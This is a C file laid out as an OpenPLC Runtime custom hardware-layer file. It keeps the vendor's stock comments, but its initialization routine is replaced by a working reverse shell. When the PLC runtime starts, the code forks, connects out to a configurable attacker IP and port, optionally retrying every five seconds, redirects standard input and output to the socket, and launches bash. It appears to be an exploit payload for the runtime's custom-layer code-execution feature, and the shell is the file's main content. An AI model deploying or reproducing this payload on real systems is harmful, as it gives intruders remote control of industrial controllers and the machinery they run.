//-----------------------------------------------------------------------------
// DISCLAIMER: EDDITING THIS FILE CAN BREAK YOUR OPENPLC RUNTIME! IF YOU DON'T
// KNOW WHAT YOU'RE DOING, JUST DON'T DO IT. EDIT AT YOUR OWN RISK.
//
// PS: You can always restore original functionality if you broke something
// in here by clicking on the "Restore Original Code" button above.
//-----------------------------------------------------------------------------

#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"0.0.0.0"
# define CLIENT_PORT (int)0
#endif
/* ================================================== */

//-----------------------------------------------------------------------------
// These are the ignored I/O vectors. If you want to override how OpenPLC
// handles a particular input or output, you must put them in the ignored
// vectors. For example, if you want to override %IX0.5, %IX0.6 and %IW3
// your vectors must be:
//     int ignored_bool_inputs[] = {5, 6}; //%IX0.5 and %IX0.6 ignored
//     int ignored_int_inputs[] = {3}; //%IW3 ignored
//
// Every I/O on the ignored vectors will be skipped by OpenPLC hardware layer
//-----------------------------------------------------------------------------
int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

//-----------------------------------------------------------------------------
// This function is called by the main OpenPLC routine when it is initializing.
// Hardware initialization procedures for your custom layer should be here.
//-----------------------------------------------------------------------------
void initCustomLayer(){

    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
		return (1);
	}

	pid_t pid = fork();

	if (pid == -1) {
		write(2, "[ERROR] fork failed.\n", 21);
		return (1);
	}
    
	if (pid > 0) {
		return (0);
	}

	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(CLIENT_PORT);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
	int sockt = socket(AF_INET, SOCK_STREAM, 0);

    #ifdef WAIT_FOR_CLIENT
        while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
            sleep(5);
        }
    #else
        if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
            write(2, "[ERROR] connect failed.\n", 24);
            return (1);
        }
    #endif

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/bash", argv, NULL);

	return (0);
}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal input
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomIn(){}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal output
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomOut(){}